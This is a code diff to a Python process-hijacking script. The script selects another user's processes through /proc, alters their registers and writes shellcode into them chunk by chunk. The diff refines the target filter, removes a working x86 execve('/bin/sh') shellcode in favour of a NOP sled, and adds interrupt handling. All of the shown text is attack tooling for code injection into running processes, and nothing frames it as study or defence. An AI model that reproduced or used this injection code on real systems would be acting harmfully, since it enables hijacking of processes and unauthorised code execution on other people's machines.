@@ -81,7 +81,7 @@ def pick_user_process():
                     if uid == user_uid:
                         with open(f'/proc/{proc}/cmdline', 'r') as cmd_file:
                             cmdline = cmd_file.read()
-                            if 'ssh' not in cmdline and 'systemd' not in cmdline and 'dbus' not in cmdline:
+                            if 'ssh' not in cmdline and 'systemd' not in cmdline and 'dbus' not in cmdline and 'su' not in cmdline and 'bash' not in cmdline:
                                 processes.append(int(proc))
             except (FileNotFoundError, IndexError, PermissionError):
                 continue
@@ -127,7 +127,7 @@ def start_hijacking():
                 print(f"Modified registers: {get_regs(pid)}")
 
                 # Run the shellcode
-                shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+                shellcode = b'\x90' * 100  # NOP sled
                 for i in range(0, len(shellcode), 4):
                     chunk = shellcode[i:i+4]
                     chunk = chunk.ljust(4, b'\x00')  # Ensure the chunk is 4 bytes
@@ -143,6 +143,10 @@ def start_hijacking():
             except (ctypes.ArgumentError, OSError, Exception) as e:
                 print(f"Error occurred: {e}. Retrying with a different PID...")
                 time.sleep(1)  # Give it some time before retrying
+                continue
+            except KeyboardInterrupt:
+                print("Process hijacking interrupted by user.")
+                break
     except Exception as e:
         print(f"Error occurred: {e}.")
         raise Exception("Process hijacking failed")  # Raise an exception
